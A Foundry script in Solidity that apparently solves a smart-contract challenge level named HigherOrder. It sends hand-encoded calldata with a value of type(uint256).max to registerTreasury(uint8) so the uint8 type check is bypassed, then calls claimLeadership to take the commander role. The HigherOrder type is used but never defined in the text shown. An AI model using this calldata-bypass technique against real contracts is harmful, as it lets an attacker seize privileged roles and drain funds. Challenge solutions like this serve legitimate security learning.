// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

contract Deploy is Script {
    address target = 0x313E0C0f29e1063E6cD8f1eB66bdcb9EF360F362;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        target.call(abi.encodeWithSignature("registerTreasury(uint8)",type(uint256).max));

        HigherOrder(target).claimLeadership();

        console.log("commander:", HigherOrder(target).commander());
        console.log("treasury:", HigherOrder(target).treasury());
        
        vm.stopBroadcast();
    }
}